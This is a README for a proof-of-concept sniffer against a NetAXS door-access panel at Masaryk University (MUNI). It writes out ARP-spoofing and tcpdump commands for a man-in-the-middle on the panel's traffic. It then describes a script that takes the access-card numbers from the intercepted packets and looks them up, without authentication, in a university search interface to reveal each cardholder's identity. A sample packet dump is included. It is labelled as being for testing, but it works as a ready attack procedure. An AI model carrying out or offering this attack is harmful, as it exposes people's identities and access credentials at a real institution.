# MUNI NetAXS sniffer POC - for testing purposes

## DO NOT FORGET TO ALLOW IPV4 FORWARDING!
``` sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' ```

``` sudo arpspoof -i eth0 [IP of NetAXS] -t [IP of Gateway] ```
``` sudo arpspoof -i eth0 [IP of Gateway] -t [IP of NetAXS] ```

``` sudo tcpdump -X -i eth0 tcp and src [IP of NetAXS] | python3 netaxs_muni.py ```

or to filter out duplicities use a MAC address

``` sudo tcpdump -X -i eth0 tcp and ether src [MAC of NetAXS] | python3 netaxs_muni.py ```

script netaxs_muni.py will take the 4 bytes from packet (marked as "CARD HERE" in the example), converts them to endianity compatible with is.muni.cz, then uses old search interface from "Úschovna" which is capable
of search based on the card number (even for unauthentized users!!). Because NetAXS gives us only last 4 bytes (ignores the first one), the script tries most used prefixes used on MUNI (06, 08, 0E)
If the úschovna search is successful, script prints out the Identity together with full card number.

example:
```
19:30:36.842327 IP [IP of NetAXS] > [IP of Database server]: Flags [P.], seq 810:927, ack 100, win 8816, length 117
	0x0000:  4500 009d 155b 4000 4006 51b1 93fb cc7b  E....[@.@.Q....{
	0x0010:  93fb dedc 0bb9 e812 a28c c594 671c cde7  ............g...
	0x0020:  5018 2270 12ff 0000 0473 0000 014d 2302  P."p.....s...M#.
	0x0030:  0106 0001 0064 0005 5754 0001 5b1d 603c  .....d..WT..[.`<
	0x0040:  0000 0000 0003 0002 0306 0000 0002 0000  ................
	0x0050:  0000 CARD HERE 0000 0000 0000 0000 4d69  ..****........Mi
	0x0060:  7261 6b5a 6164 6e69 5663 686f 6443 7465  rakZadniVchodCte
	0x0070:  636b 6132 6100 0000 0000 0000 0000 0000  cka2a...........
	0x0080:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0090:  0000 0000 0000 0000 0000 0403 58         ............X
```


